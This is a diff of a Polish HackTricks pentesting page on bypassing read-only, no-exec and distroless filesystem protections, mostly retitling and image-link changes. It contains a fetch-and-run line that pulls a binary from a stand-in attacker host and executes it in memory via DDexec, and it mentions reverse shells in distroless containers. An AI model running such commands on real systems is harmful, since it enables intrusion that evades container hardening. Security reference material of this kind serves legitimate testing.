@@ -1,4 +1,4 @@
-# Ominięcie zabezpieczeń systemu plików: tylko do odczytu / brak wykonywania / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@ Inne sposoby wsparcia HackTricks:
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/pl/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego, zarówno pisanego, jak i mówionego_).
 
@@ -81,10 +81,12 @@ Dlatego **kontrolując kod asemblera**, który jest wykonywany przez proces, mo�
 {% hint style="success" %}
 **DDexec / EverythingExec** pozwoli Ci załadować i **wykonać** swój własny **shellcode** lub **dowolny binarny plik** z **pamięci**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 ### MemExec
 
 [**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. To **zdemilitaryzowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.
@@ -125,7 +127,7 @@ Jednak w tego rodzaju kontenerach te protekcje zazwyczaj istnieją, ale możesz 
 
 Możesz znaleźć **przykłady**, jak **wykorzystać niektóre podatności RCE** do uzyskania **odwróconych powłok języków skryptowych** i uruchamiania plików binarnych z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/pl/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Jeśli jesteś zainteresowany **karierą w dziedzinie hakowania** i hakiem na niehakowalne - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego w mowie i piśmie_).
 
